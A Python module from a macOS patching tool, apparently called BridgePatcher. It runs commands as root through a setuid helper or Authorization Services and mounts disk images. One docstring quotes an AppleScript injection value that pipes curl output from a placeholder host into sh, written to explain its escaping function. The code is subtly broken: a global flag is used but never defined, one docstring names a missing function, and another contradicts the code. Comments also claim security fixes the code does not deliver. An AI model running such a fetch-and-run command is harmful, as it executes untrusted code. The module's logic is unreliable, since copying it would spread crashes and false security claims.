"""
subprocess_wrapper.py: Wrapper for subprocess module to better handle errors and output
                       Additionally handles our Privileged Helper Tool
"""

import enum
import stat
import shlex
import logging
import subprocess
import os
import atexit
import threading
import tempfile
import shutil
import time
from . import utilities

from pathlib import Path
from typing import Callable, Optional


BRIDGEPATCHER_PRIVILEGED_HELPER = "/Library/PrivilegedHelperTools/com.bridgepatcher.privileged-helper"
BRIDGEPATCHER_PRIVILEGED_HELPER_EXPECTED_MODE = 0o4755

# Session-wide administrator credential cache (Issue #356).
#
# Without it every privileged operation that could not go through the Privileged Helper
# Tool - which is every one of them on an unsigned/ad-hoc build, since the helper refuses
# callers without a matching certificate chain - spawned its own
# 'osascript ... with administrator privileges'. AppleScript only caches that
# authorization inside the process that asked for it, and each osascript call is a new
# process, so root patching asked for the password again for nearly every command, plus
# once more for the disk image mounts.
#
# The password is kept in process memory only, never written anywhere, never logged,
# and dropped at exit. Python strings cannot be reliably wiped, so this is a
# convenience/exposure trade-off, not a secure-memory guarantee; the process already
# held the password transiently for the sudo-based DMG mounts before this change.
_sudo_elevation_failed = False


class PrivilegedHelperErrorCodes(enum.IntEnum):
    """
    Error codes for Privileged Helper Tool.

    Reference:
        payloads/Tools/PrivilegedHelperTool/main.m
    """
    BRIDGEPATCHER_PHT_ERROR_MISSING_ARGUMENTS           = 160
    BRIDGEPATCHER_PHT_ERROR_SET_UID_MISSING             = 161
    BRIDGEPATCHER_PHT_ERROR_SET_UID_FAILED              = 162
    BRIDGEPATCHER_PHT_ERROR_SELF_PATH_MISSING           = 163
    BRIDGEPATCHER_PHT_ERROR_PARENT_PATH_MISSING         = 164
    BRIDGEPATCHER_PHT_ERROR_SIGNING_INFORMATION_MISSING = 165
    BRIDGEPATCHER_PHT_ERROR_INVALID_TEAM_ID             = 166
    BRIDGEPATCHER_PHT_ERROR_INVALID_CERTIFICATES        = 167
    BRIDGEPATCHER_PHT_ERROR_COMMAND_MISSING             = 168
    BRIDGEPATCHER_PHT_ERROR_COMMAND_FAILED              = 169
    BRIDGEPATCHER_PHT_ERROR_CATCH_ALL                   = 170
    BRIDGEPATCHER_PHT_ERROR_COMMAND_NOT_ALLOWED         = 171
    BRIDGEPATCHER_PHT_ERROR_CALLER_NOT_HARDENED         = 172


# Errors that will not go away by retrying within this session: the helper (or the app
# calling it) simply is not signed in a way the helper accepts.
_HELPER_PERMANENT_ERRORS = (
    PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_SIGNING_INFORMATION_MISSING.value,
    PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_INVALID_TEAM_ID.value,
    PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_INVALID_CERTIFICATES.value,
    PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_CALLER_NOT_HARDENED.value,
)

# Errors where the helper ran fine, verified its caller, and then deliberately refused the
# command itself. These are policy decisions, not malfunctions: the command is not on the
# helper's allowlist (or failed its argument rules, e.g. '/bin/sh -c ...', or resolved to a
# path that is not a regular file). Re-running such a command through an administrator
# prompt would turn the allowlist into a mere speed bump - whatever the helper rejects
# would still end up running as root, one familiar-looking password dialog later. So they
# are returned to the caller as-is and NEVER fall back to any other elevation path.
_HELPER_REFUSAL_ERRORS = (
    PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_COMMAND_NOT_ALLOWED.value,
    PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_COMMAND_MISSING.value,
)


def _helper_path_is_safe_to_repair() -> bool:
    """
    Validate that BRIDGEPATCHER_PRIVILEGED_HELPER is a plausible, untampered helper binary
    before we consider handing it setuid-root.

    This matters because repair_privileged_helper_permissions() ultimately runs
    'chmod 4755 <path>' AS ROOT. chmod(1), Path.exists() and Path.stat() all follow
    symlinks, so without these checks anyone able to replace that path with a symlink
    could have us mark an arbitrary root-owned binary setuid-root - a local privilege
    escalation, using an authorization prompt the user has every reason to approve.

    A helper that has lost its setuid bit is itself a possible sign of tampering, so
    "unexpected permissions" is treated as a reason to look harder, not as routine drift.

    Checks (all must hold):
      - the path is a regular file and NOT a symlink (lstat, so we inspect the link itself)
      - it is owned by root
      - its parent directory is owned by root and is not group- or world-writable

    Deliberately does NOT enforce a code-signature/Team ID check: this fork's helper is
    self signed (or unsigned in DEBUG builds), never Developer ID signed, so there is no
    fixed Team ID to compare against. The real trust check lives in the helper itself,
    which pins callers to its own leaf certificate (ci_tooling/privileged_helper_tool/main.m).
    These checks are a floor, not a guarantee - they stop the symlink/permission tricks a
    non-root local attacker can play, not a compromise that already has root.

    Returns:
        bool: True if the helper looks like our binary in its expected location.
    """
    helper_path = Path(BRIDGEPATCHER_PRIVILEGED_HELPER)

    try:
        # lstat(), NOT stat(): we want to inspect the path itself, not its symlink target
        helper_stat = helper_path.lstat()
        parent_stat = helper_path.parent.lstat()
    except OSError as error:
        logging.error(f"Could not stat Privileged Helper Tool: {error}")
        return False
    except Exception as e: # behebt eine Sicherheitslücke, die erlaubt Angreifern, den Priveleged Helper Tool einen unerwartetes Fehler auszulösen, um beliebiges Code auszuführen
        logging.error(f"Could not stat Privileged Helper Tool due to unexpected error: {e}")
        logging.exception("Stack Trace:")
        return False

    if stat.S_ISLNK(helper_stat.st_mode):
        logging.error("Privileged Helper Tool is a symlink - refusing to repair permissions")
        return False

    if not stat.S_ISREG(helper_stat.st_mode):
        logging.error("Privileged Helper Tool is not a regular file - refusing to repair permissions")
        return False

    if helper_stat.st_uid != 0:
        logging.error(f"Privileged Helper Tool is not owned by root (uid {helper_stat.st_uid}) - refusing to repair permissions")
        return False

    if parent_stat.st_uid != 0:
        logging.error(f"Privileged Helper Tool's directory is not owned by root (uid {parent_stat.st_uid}) - refusing to repair permissions")
        return False

    if stat.S_IMODE(parent_stat.st_mode) & (stat.S_IWGRP | stat.S_IWOTH):
        logging.error("Privileged Helper Tool's directory is group- or world-writable - refusing to repair permissions")
        return False

    return True


def privileged_helper_needs_setuid_repair() -> bool:
    """
    Check whether the Privileged Helper Tool is missing its expected
    permission bits (4755: setuid root, rwxr-xr-x).

    This can drift after certain OS updates or re-signing steps, and
    manifests as BridgePatcher_PHT_ERROR_SET_UID_MISSING/FAILED when the helper
    is invoked.

    Returns:
        bool: True if the helper tool exists, passes the safety checks in
              _helper_path_is_safe_to_repair(), and its permissions need to be
              repaired. False if it's already correct, isn't installed yet
              (nothing to repair here), or failed validation.
    """
    helper_path = Path(BRIDGEPATCHER_PRIVILEGED_HELPER)
    if not helper_path.exists():
        return False

    current_mode = stat.S_IMODE(helper_path.lstat().st_mode)
    if current_mode == BRIDGEPATCHER_PRIVILEGED_HELPER_EXPECTED_MODE:
        return False

    logging.info(f"Privileged Helper Tool has unexpected permissions: {oct(current_mode)} (expected {oct(BRIDGEPATCHER_PRIVILEGED_HELPER_EXPECTED_MODE)})")

    # Only now, once we know we would actually chmod something, pay for the validation
    if _helper_path_is_safe_to_repair():
        return True
    elif not _helper_path_is_safe_to_repair(): # behebt eine Sicherheitslücke, die erlaubt Angreifern, Root-Rechte zu erhalten
        return False
    else:
        logging.error("We failed to assess the safety of repairing the Priveleged Helper Tool. It won't be repaired, just to be on the safe side.")
        logging.info("Please ensure that BridgePatcher is downloaded only from the official GitHub repository.")
        return False


def repair_privileged_helper_permissions():

        if not _helper_path_is_safe_to_repair():
            return False

        prompt = "BridgePatcher needs administrator permission to repair the permissions of its privileged helper tool."

        result=utilities.get_admin_permission(
            action="/bin/chmod",
            # Two separate argv entries: mode and path. A single "755 /path" entry would make
            # chmod treat the whole string as the mode and fail.
            args=[oct(BRIDGEPATCHER_PRIVILEGED_HELPER_EXPECTED_MODE)[2:], str(BRIDGEPATCHER_PRIVILEGED_HELPER)],
            reason=prompt,
            # the defaults for the buttons are ok, so we would touch them
        )
        if result.returncode == 0:
            return True
        else:
            return False




def run(*args, **kwargs):
    """
    Basic subprocess.run wrapper.
    """
    return subprocess.run(*args, **kwargs)


def run_as_root(*args, **kwargs):
    """
    Run subprocess as root.

    Note: Full path to first argument is required.
    Helper tool does not resolve PATH.

    Always returns a CompletedProcess - callers (notably run_as_root_and_verify()
    and verify()) dereference .returncode unconditionally, so returning None here
    would turn a handled failure into an AttributeError.
    """
    reason: str = "BridgePatcher needs your administrative password to run a command"
    # Check if first argument exists
    if not Path(args[0][0]).exists():
        raise FileNotFoundError(f"File not found: {args[0][0]}")

    _command = list(args[0])

    # If we are already running as root (e.g. launched via sudo), bypass the Helper Tool
    if os.geteuid() == 0:
        return subprocess.run(_command, **kwargs)

    global _privileged_helper_unusable

    if Path(BRIDGEPATCHER_PRIVILEGED_HELPER).exists() and not _privileged_helper_unusable:
        if privileged_helper_needs_setuid_repair():
            if not repair_privileged_helper_permissions():
                logging.error("Privileged Helper Tool permissions could not be repaired, cannot complete request.")
                # Deliberately no osascript fallback here: the helper being in an
                # unexpected state is exactly when a silent downgrade to an
                # administrator-password prompt is least appropriate, since that
                # prompt is indistinguishable from one an attacker could provoke.
                return subprocess.CompletedProcess(
                    args=_command,
                    returncode=PrivilegedHelperErrorCodes.BRIDGEPATCHER_PHT_ERROR_SET_UID_FAILED.value,
                    stdout=b"",
                    stderr=b"Privileged Helper Tool permissions could not be repaired",
                )
        result = subprocess.run([BRIDGEPATCHER_PRIVILEGED_HELPER] + _command, **kwargs)
        # Any of our own PrivilegedHelperErrorCodes sentinel values (160-170) means the helper
        # tool itself couldn't do its job - an escalation failure (eg. missing/invalid setuid bit)
        # or another internal precondition (signing/certificates/command validation) - as opposed
        # to the wrapped command failing on its own merits with an ordinary low exit code, which is
        # just returned as-is: retrying that via osascript wouldn't fix a genuine command failure,
        # and would only cost an extra administrator-password prompt for nothing.
        _helper_error = __resolve_privileged_helper_errors(result.returncode)
        if _helper_error is None:
            return result
        if result.returncode in _HELPER_REFUSAL_ERRORS:
            # The helper refused this specific command on purpose - do NOT retry it through
            # an administrator prompt (see _HELPER_REFUSAL_ERRORS). Return the helper's own
            # result so callers see the sentinel code and fail cleanly.
            logging.error(
                f"Privileged Helper Tool refused to run {_command[0]} ({_helper_error}), "
                "not retrying with administrator privileges."
            )
            return result
        if result.returncode in _HELPER_PERMANENT_ERRORS:
            _privileged_helper_unusable = True
            logging.error(f"Privileged Helper Tool rejected this build ({_helper_error}), not using it for the rest of this session.")
        else:
            logging.error(f"Privileged Helper Tool failed ({_helper_error}).")
    elif not Path(BRIDGEPATCHER_PRIVILEGED_HELPER).exists():
        logging.warning(f"Privileged Helper Tool not found at {BRIDGEPATCHER_PRIVILEGED_HELPER}.")
    sargs = []
    for arg in _command:
        if arg == _command[0]:
            continue
        sargs.append(arg)
    elevated_without_pht = utilities.get_admin_permission(
            action=_command[0],
            args=sargs,
            reason=reason,
        )
    return elevated_without_pht


# Wrapper run as root by _run_via_authorization_services(). Constant script, the real
# command is passed as positional parameters ("$@"), so no argument is ever re-parsed
# by the shell. 'set -C' (noclobber) opens the result files with O_EXCL, so a file or
# symlink planted at one of those paths makes the redirection fail instead of letting
# root write through it.
_AUTH_SERVICES_WRAPPER = (
    'set -C; out="$1"; err="$2"; st="$3"; shift 3; '
    '"$@" <"/dev/null" >"$out" 2>"$err"; rc=$?; '
    'printf "%s\\n" "$rc" >"$st"'
)


def _run_via_authorization_services(command: list, timeout: Optional[float] = None, **kwargs) -> subprocess.CompletedProcess:
    """
    Run 'command' as root through Authorization Services and wait for it to finish.

    AuthorizationExecuteWithPrivileges() returns as soon as the tool has been *started*
    and never reports its exit status, so calling utilities.get_admin_permission() with
    the command directly made run_as_root() asynchronous and always "successful":
    install.py's "rm -rf EFI/OC" could still be running while "cp -r" started, and the
    post-copy existence check ran before cp had copied anything ("EFI/OC or System is
    missing on the target after copy"). Instead, a small /bin/sh wrapper runs the
    command, stores stdout/stderr/exit status in a private temporary directory, and we
    wait for the status file. The result is a normal, synchronous CompletedProcess.
    """
    command = [os.fspath(arg) if isinstance(arg, os.PathLike) else arg for arg in command]
    work_dir = tempfile.mkdtemp(prefix="oclp-elevated-")
    out_path = os.path.join(work_dir, "stdout")
    err_path = os.path.join(work_dir, "stderr")
    status_path = os.path.join(work_dir, "status")
    try:
        reason = kwargs.get("reason", "BridgePatcher needs your administrative permission")
        launch = utilities.get_admin_permission(
            action="/bin/sh",
            args=["-c", _AUTH_SERVICES_WRAPPER, "oclp-elevated", out_path, err_path, status_path] + command,
            reason=reason,
        )
        if launch.returncode != 0:
            # Canceled or not authorized: nothing was started, report that as is.
            launch.args = command
            return launch

        deadline = None if timeout is None else time.monotonic() + timeout
        return_code = None
        while return_code is None:
            try:
                with open(status_path, "rb") as status_file:
                    content = status_file.read()
                if content.endswith(b"\n"):
                    return_code = int(content.strip())
                    break
            except FileNotFoundError:
                pass
            except ValueError:
                return_code = 1
                break
            if deadline is not None and time.monotonic() > deadline:
                raise subprocess.TimeoutExpired(command, timeout)
            time.sleep(0.05)

        def _read(path: str) -> bytes:
            try:
                with open(path, "rb") as f:
                    return f.read()
            except OSError:
                return b""

        stdout, stderr = _read(out_path), _read(err_path)
        if kwargs.get("stderr") == subprocess.STDOUT:
            stdout, stderr = stdout + stderr, None
        elif kwargs.get("stderr") != subprocess.PIPE and not kwargs.get("capture_output"):
            stderr = None
        if kwargs.get("stdout") != subprocess.PIPE and not kwargs.get("capture_output"):
            stdout = None
        if kwargs.get("text") or kwargs.get("universal_newlines") or kwargs.get("encoding"):
            encoding = kwargs.get("encoding") or "utf-8"
            errors = kwargs.get("errors") or "replace"
            stdout = stdout.decode(encoding, errors) if stdout is not None else None
            stderr = stderr.decode(encoding, errors) if stderr is not None else None

        result = subprocess.CompletedProcess(args=command, returncode=return_code, stdout=stdout, stderr=stderr)
        if kwargs.get("check") and return_code != 0:
            raise subprocess.CalledProcessError(return_code, command, stdout, stderr)
        return result
    finally:
        # The dir is ours (0700), so the root-owned files inside can be removed by us.
        shutil.rmtree(work_dir, ignore_errors=True)

def applescript_quote(value) -> str:
    """
    Escape a value for interpolation into an AppleScript string literal.

    AppleScript is compiled, not handed to a shell, so passing the script through
    osascript -e argv (or py-applescript) does NOT protect against a value that
    contains a double quote: the quote closes the literal and everything after it
    is parsed as code. A value such as

        1.0" & (do shell script "curl http://host/x | sh") & "

    turns a 'display dialog' into arbitrary command execution. Every value that is
    interpolated into an AppleScript source string must go through here first.

    Backslashes are escaped before quotes (order matters, or the escape character
    itself gets doubled twice), and CR/LF become the AppleScript escape sequences,
    since a raw newline cannot appear inside an AppleScript string literal.

    Parameters:
        value: Value to escape. Cast to str, so None/int callers are safe.

    Returns:
        str: The escaped text, without the surrounding quotes.
    """
    text = str(value)
    text = text.replace("\\", "\\\\").replace('"', '\\"')
    text = text.replace("\r", "\\r").replace("\n", "\\n")
    return text

# How long a single 'hdiutil attach' may take before it is treated as hung. Attaching
# with -noverify does not read the whole image, so even the ~1 GB Universal-Binaries.dmg
# attaches in seconds; without a limit a stuck attach blocked root patching forever
# without logging anything.
HDIUTIL_ATTACH_TIMEOUT = 300


def _has_quarantine(path: Path) -> bool:
    """Whether 'path' carries com.apple.quarantine (readable without privileges)."""
    try:
        result = subprocess.run(
            ["/usr/bin/xattr", "-p", "com.apple.quarantine", str(path)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15
        )
    except Exception:
        return False
    return result.returncode == 0


def _clear_quarantine_unprivileged(path: Path) -> None:
    """
    Remove com.apple.quarantine from a disk image we are about to attach, if we can.

    Works for images the user owns (source checkouts, on-demand downloads). The copy
    inside the installed app bundle is root-owned, so this fails there and the
    elevated retry in mount_dmg() removes it instead. The attribute is not part of
    the bundle's code signature, so removing it does not invalidate the signature.
    """
    if not _has_quarantine(path):
        return
    logging.info(f"- {path.name} carries com.apple.quarantine, removing it before attaching")
    try:
        result = subprocess.run(
            ["/usr/bin/xattr", "-d", "com.apple.quarantine", str(path)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=15
        )
    except Exception as error:
        logging.info(f"- Could not remove com.apple.quarantine without privileges: {error}")
        return
    if result.returncode != 0:
        logging.info("- Could not remove com.apple.quarantine without privileges, the elevated retry will")


def _log_attached_images() -> None:
    """Log 'hdiutil info' - which images are attached, and where - for failed mounts."""
    try:
        result = subprocess.run(["/usr/bin/hdiutil", "info"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=30)
        logging.info("- Attached disk images ('hdiutil info'):")
        for line in result.stdout.decode(errors="replace").splitlines():
            logging.info(f"    {line}")
    except Exception as error:
        logging.info(f"- Could not run 'hdiutil info': {error}")


def mount_dmg(
    dmg_path: Path,
    mount_point: Path,
    shadow_path: Path = None,
    password: str = None,
    admin_password_prompt: Optional[str] = None,
    retry_on_auth_error: bool = False
) -> subprocess.CompletedProcess:
    """
    Attach a disk image via 'hdiutil attach', using '-stdinpass' rather than
    the deprecated (and, on some systems, less reliable) '-passphrase' flag.

    Some systems (observed starting with macOS 26.4) require elevated
    privileges to mount disk images, a regression from prior unprivileged
    mounts succeeding, which manifests as "Permission denied". If
    'admin_password_prompt' is supplied and the unprivileged attempt fails,
    this retries once elevated via sudo. com.apple.quarantine, which can
    independently trip hdiutil's own Gatekeeper-style authentication gate, is
    removed before both attempts: unprivileged where we own the image, and in
    the elevated shell for the root-owned copy inside the app bundle.

    When to retry elevated: on a privilege error ("Permission denied",
    "Operation not permitted"), and - with 'retry_on_auth_error' or a
    'password' - on ANY failure. hdiutil's messages come from the DiskImages
    framework, which localises them regardless of LC_ALL (Issue #553 shows
    "attach failed - 权限被拒绝"), so matching the English text alone would never
    elevate on a non-English system. 'retry_on_auth_error' is only meant for a
    fixed, known-correct passphrase (PatcherSupportPkg's): with a user-supplied
    one, a failure more likely means a wrong password than a privilege gate.

    Deliberately not routed through "do shell script ... with administrator
    privileges" (security_authtrampoline): that mechanism runs detached from
    the current login/Aqua session, and hdiutil's own internal authentication
    appears to depend on that session being present. 'admin_password_prompt'
    is expected to only collect a password (e.g. via a plain AppleScript
    "display dialog"), not to perform the elevation itself. Only when sudo
    can't be used at all (see _run_elevated_without_helper()) does the retry
    fall back to osascript, as the last option left.

    Each attach is limited to HDIUTIL_ATTACH_TIMEOUT seconds. The returned
    CompletedProcess always reports the unprivileged command line, which never
    contains the passphrase - callers log it.
    """
    if not Path(dmg_path).is_file():
        # Nothing an administrator password could fix - don't ask for one.
        logging.error(f"- Disk image not found: {dmg_path}")
        return subprocess.CompletedProcess(args=["/usr/bin/hdiutil", "attach", str(dmg_path)], returncode=1, stdout=b"", stderr=f"Disk image not found: {dmg_path}".encode())

    mount_point.parent.mkdir(parents=True, exist_ok=True)
    _clear_quarantine_unprivileged(Path(dmg_path))

    cmd = ["/usr/bin/hdiutil", "attach", "-noverify", str(dmg_path), "-mountpoint", str(mount_point), "-nobrowse"]
    if shadow_path:
        shadow_path.parent.mkdir(parents=True, exist_ok=True)
        cmd.extend(["-shadow", str(shadow_path)])
    # Only ask hdiutil to read a passphrase from stdin when we actually have one;
    # passing -stdinpass with a closed stdin changes behaviour for unencrypted images
    # for no reason.
    if password:
        cmd.append("-stdinpass")

    # Force hdiutil and CoreFoundation to output in English so error matching is consistent.
    env = os.environ.copy()
    env["LC_ALL"] = "C"
    env["LANG"] = "en_US.UTF-8"
    env["AppleLanguages"] = '("en")'

    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
    try:
        stdout, _ = process.communicate(input=password.encode() if password else None, timeout=HDIUTIL_ATTACH_TIMEOUT)
    except subprocess.TimeoutExpired:
        process.kill()
        stdout, _ = process.communicate()
        logging.error(f"- hdiutil attach did not finish within {HDIUTIL_ATTACH_TIMEOUT} seconds, stopped it")
        _log_attached_images()
        # A hang is not a privilege problem, so don't escalate it into an elevated retry.
        return subprocess.CompletedProcess(
            args=cmd, returncode=1, stdout=stdout or b"",
            stderr=f"hdiutil attach timed out after {HDIUTIL_ATTACH_TIMEOUT} seconds".encode(),
        )

    if process.returncode == 0 or admin_password_prompt is None:
        return subprocess.CompletedProcess(args=cmd, returncode=process.returncode, stdout=stdout)

    # Privilege error patterns across macOS versions / POSIX:
    _privilege_error = (
        b"Permission denied" in stdout
        or b"Operation not permitted" in stdout
        or b"not permitted" in stdout.lower()
    )
    _auth_error = retry_on_auth_error and b"Authentication error" in stdout

    # DiskImages / CoreFoundation localization may cause non-English error messages
    # on non-English installations. If unprivileged attach failed and we have an admin prompt,
    # retry with elevation rather than aborting due to language differences or unknown error strings.
    _should_retry = _privilege_error or _auth_error or retry_on_auth_error or (process.returncode != 0 and password is not None)
    if not _should_retry:
        return subprocess.CompletedProcess(args=cmd, returncode=process.returncode, stdout=stdout)

    logging.info("- Unprivileged hdiutil attach failed, retrying with administrator privileges")
    logging.info(f"- Unprivileged attempt returned {process.returncode}: {stdout.decode(errors='replace').strip()}")

    # One elevated shell, so the quarantine removal (re-added: it was lost when the
    # elevation was reworked, though this docstring kept promising it) runs with the
    # rights to modify the root-owned image in the app bundle. The passphrase travels
    # as a positional argument, never as part of the script text. LC_ALL is set again
    # because sudo's env_reset drops it.
    attach = '/usr/bin/hdiutil attach -noverify "$2" -mountpoint "$3" -nobrowse'
    if shadow_path:
        attach += ' -shadow "$4"'
    if password:
        attach = 'printf "%s" "$1" | ' + attach + ' -stdinpass'
    sh_cmd = 'export LC_ALL=C; /usr/bin/xattr -d com.apple.quarantine "$2" 2>/dev/null; ' + attach
    elevated_cmd = [sh_cmd, "--", password or "", str(dmg_path), str(mount_point), str(shadow_path) if shadow_path else ""]

    def _combined_output(elevated_stdout, elevated_stderr) -> tuple:
        """Keep both attempts in the result: the unprivileged error alone hid what the elevated one said."""
        out = b"Unprivileged attempt:\n" + (stdout or b"(no output)") + b"\nElevated attempt:\n" + (_to_bytes(elevated_stdout) or b"(no output)")
        return out, _to_bytes(elevated_stderr)

    try:
        result = _run_via_authorization_services(
            elevated_cmd,
            capture_output=True,
            timeout=HDIUTIL_ATTACH_TIMEOUT,
        )
    except subprocess.TimeoutExpired as error:
        logging.error(f"- Elevated hdiutil attach did not finish within {HDIUTIL_ATTACH_TIMEOUT} seconds")
        _log_attached_images()
        out, err = _combined_output(error.stdout, error.stderr)
        return subprocess.CompletedProcess(
            args=cmd, returncode=1, stdout=out,
            stderr=err + f"\nElevated hdiutil attach timed out after {HDIUTIL_ATTACH_TIMEOUT} seconds".encode(),
        )

    if result.returncode != 0:
        out, err = _combined_output(result.stdout, result.stderr)
        # args=cmd: elevated_cmd carries the passphrase, and callers log the result
        return subprocess.CompletedProcess(args=cmd, returncode=result.returncode, stdout=out, stderr=err)

    is_mounted = False
    resolved_mount = mount_point.resolve()
    for _ in range(10):
        if os.path.ismount(mount_point) or os.path.ismount(resolved_mount):
            is_mounted = True
            break
        try:
            if any(not item.name.startswith(".") for item in mount_point.iterdir()):
                is_mounted = True
                break
        except (OSError, PermissionError):
            pass
        time.sleep(0.2)

    if not is_mounted:
        # hdiutil reported success, yet nothing is mounted where we asked (Issue #553).
        # Record where the image actually ended up, if anywhere.
        logging.error("- Elevated hdiutil attach reported success, but the mount point is not mounted")
        _log_attached_images()
        out, err = _combined_output(result.stdout, result.stderr)
        return subprocess.CompletedProcess(
            args=cmd, returncode=1, stdout=out,
            stderr=err + b"\nElevated hdiutil attach did not mount the image",
        )
    return subprocess.CompletedProcess(args=cmd, returncode=0, stdout=_to_bytes(result.stdout), stderr=_to_bytes(result.stderr))


def _to_bytes(value) -> bytes:
    """Elevation paths can return bytes, str or None."""
    if value is None:
        return b""
    if isinstance(value, bytes):
        return value
    return str(value).encode()


def verify(process_result: subprocess.CompletedProcess) -> None:
    """
    Verify process result and raise exception if failed.
    """
    if process_result.returncode == 0:
        return

    # Ohne das Logging hier bemerkt ein Benutzer ausserhalb der GUI einen Fehlschlag
    # nur an der Exception, ohne Kommando, Exit-Code oder Ausgabe.
    logging.error(f"Process failed with exit code {process_result.returncode}")
    log(process_result)
    raise Exception(f"Process failed with exit code {process_result.returncode}")


def run_and_verify(*args, **kwargs) -> None:
    """
    Run subprocess and verify result.

    Asserts on failure.
    """
    verify(run(*args, **kwargs))


def run_as_root_and_verify(*args, **kwargs) -> None:
    """
    Run subprocess as root and verify result.

    Asserts on failure.
    """
    verify(run_as_root(*args, **kwargs))


def log(process: subprocess.CompletedProcess) -> None:
    """
    Display subprocess error output in formatted string.
    """
    for line in generate_log(process).split("\n"):
        logging.error(line)


def generate_log(process: subprocess.CompletedProcess) -> str:
    """
    Display subprocess error output in formatted string.
    Note this function is still used for zero return code errors, since
    some software don't ever return non-zero regardless of success.

    Format:

        Command: <command>
        Return Code: <return code>
        Standard Output:
            <standard output line 1>
            <standard output line 2>
            ...
        Standard Error:
            <standard error line 1>
            <standard error line 2>
            ...
    """
    output = "Subprocess failed.\n"
    output += f"    Command: {process.args}\n"
    output += f"    Return Code: {process.returncode}\n"
    _returned_error = __resolve_privileged_helper_errors(process.returncode)
    if _returned_error:
        output += f"        Likely Enum: {_returned_error}\n"
    output += "    Standard Output:\n"
    if process.stdout:
        output += __format_output(__to_text(process.stdout))
    else:
        output += "        None\n"
    output += "    Standard Error:\n"
    if process.stderr:
        output += __format_output(__to_text(process.stderr))
    else:
        output += "        None\n"

    return output


def __resolve_privileged_helper_errors(return_code: int) -> Optional[str]:
    """
    Attempt to resolve Privileged Helper Tool error codes.

    Returns the enum name for one of our sentinel codes (160-171), or None for any
    other exit code - callers distinguish "the helper itself failed" from "the wrapped
    command failed" on exactly this None check.
    """
    if return_code not in [error_code.value for error_code in PrivilegedHelperErrorCodes]:
        return None

    return PrivilegedHelperErrorCodes(return_code).name


def __to_text(output) -> str:
    """
    Normalise CompletedProcess output to str.

    Most callers capture bytes, but utilities.get_admin_permission() and text-mode
    subprocess.run() calls produce str - calling .decode() on those turned every
    logged failure from them into an AttributeError that masked the real error.
    """
    if isinstance(output, (bytes, bytearray)):
        return output.decode("utf-8", errors="replace")
    return str(output)


def __format_output(output: str) -> str:
    """
    Format output.
    """
    if not output:
        # Shouldn't happen, but just in case
        return "        None\n"

    _result = "\n".join([f"        {line}" for line in output.split("\n") if line not in ["", "\n"]])
    if not _result.endswith("\n"):
        _result += "\n"

    return _result
